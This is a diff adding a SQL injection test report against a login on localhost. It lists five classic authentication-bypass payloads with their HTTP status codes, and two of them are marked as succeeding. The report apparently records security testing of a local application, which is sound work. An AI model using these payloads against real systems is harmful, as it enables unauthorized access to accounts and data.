@@ -1,0 +1,40 @@
+SQL Injection Test Report
+============================================================
+Time: 2026-05-03 13:48:27.244742
+Target: http://localhost:3000
+
+
+[Test 1]
+Payload: ' OR '1'='1
+Description: Classic OR bypass
+Status: 401
+Success: False
+------------------------------------------------------------
+
+[Test 2]
+Payload: admin'--
+Description: Comment bypass
+Status: 401
+Success: False
+------------------------------------------------------------
+
+[Test 3]
+Payload: ' OR 1=1--
+Description: Numeric OR bypass
+Status: 200
+Success: True
+------------------------------------------------------------
+
+[Test 4]
+Payload: admin' OR '1'='1'--
+Description: Admin bypass with OR
+Status: 200
+Success: True
+------------------------------------------------------------
+
+[Test 5]
+Payload: ' OR 'a'='a
+Description: String comparison bypass
+Status: 401
+Success: False
+------------------------------------------------------------
